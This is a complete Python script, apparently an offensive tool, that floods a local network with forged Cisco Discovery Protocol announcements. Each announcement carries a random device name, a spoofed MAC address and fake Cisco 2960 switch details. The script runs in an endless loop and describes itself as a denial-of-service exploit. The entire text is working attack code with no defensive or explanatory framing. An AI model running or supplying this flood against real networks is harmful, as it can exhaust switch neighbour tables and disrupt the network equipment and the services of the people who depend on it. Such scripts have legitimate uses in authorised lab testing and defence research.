#!/usr/bin/env python3

from scapy.all import *
import signal
import sys
import random
import string
import os
import struct
import argparse
from pwn import *

# Obtain Arguments
def GetArguments():
    parser = argparse.ArgumentParser(description="Exploit to do a DOS Attack through CDP protocol")
    parser.add_argument('-i', '--interface', type=str, default="ens4", dest="interface")

    return parser.parse_args()

# Ctrl+C
def handler(sig, frame):
    print(f"\n\n[+] Stopping...\n")
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

DST_MAC = "01:00:0c:cc:cc:cc"

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def generate_random_mac():
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def cdp_checksum(data):
    # Calculate CDP packet checksum
    if len(data) % 2 == 1:
        data += b'\x00'
    
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s = s + w
    
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    return ~s & 0xffff

def create_cdp_tlv(tlv_type, value):
    # Create TLV CDP 
    length = 4 + len(value)
    return struct.pack('!HH', tlv_type, length) + value

def cdp_dos_attack(interface):
    print(f"[*] Starting CDP DoS through the interface: {interface}")
    print("[*] Press Ctrl+C to stop the attack.")
    p1 = log.progress("Send Packets")
    p2 = log.progress("Sending Packets")
    count_packets=0
    
    try:
        while True:
            device_id = "RANDYN" + generate_random_string()
            mac_addr = generate_random_mac()
            port_id = f"Fas {str(random.randint(0,3))}/{str(random.randint(0,3))}"
            platform = "cisco WS-C2960-24TT-L"
            software = "Cisco IOS Software, C2960 Software (C2960-LANBASE-M), Version 12.2(55)SE"
            
            # Construct TLVs
            tlv_device = create_cdp_tlv(0x0001, device_id.encode())
            tlv_port = create_cdp_tlv(0x0003, port_id.encode())
            tlv_software = create_cdp_tlv(0x0005, software.encode())
            tlv_platform = create_cdp_tlv(0x0006, platform.encode())
            tlv_capabilities = create_cdp_tlv(0x0004, struct.pack('!I', 0x00000009))
            
            cdp_data = tlv_device + tlv_port + tlv_software + tlv_platform + tlv_capabilities
            
            # Header CDP v2: versión(1) + ttl(1) + checksum(2) - temp checksum 0
            cdp_header_temp = struct.pack('!BBH', 0x02, 0xB4, 0x0000)
            
            # Calculate checksum header + data
            full_cdp_temp = cdp_header_temp + cdp_data
            checksum = cdp_checksum(full_cdp_temp)
            
            # Header with correct checksum 
            cdp_header = struct.pack('!BBH', 0x02, 0xB4, checksum)
            cdp_packet = cdp_header + cdp_data
            
            # Complete construction
            packet = (
                Ether(dst=DST_MAC, src=mac_addr) /
                LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
                SNAP(OUI=0x00000c, code=0x2000) /
                Raw(load=cdp_packet)
            )
            
            sendp(packet, iface=interface, verbose=False)
            count_packets+=1
            p1.status(count_packets)
            p2.status(f"Device: {device_id} | MAC: {mac_addr} | Port: {port_id}")       

    except KeyboardInterrupt:
        print("\n[!] User stop the attack.")

if __name__ == "__main__":
    # Only high privilege execution
    if os.geteuid() != 0:
        print("[-] Error: This script must run with root privilege (sudo)")
        sys.exit(1)
    
    # obtain arguments 
    args=GetArguments()
    
    # Start attack 
    cdp_dos_attack(args.interface)
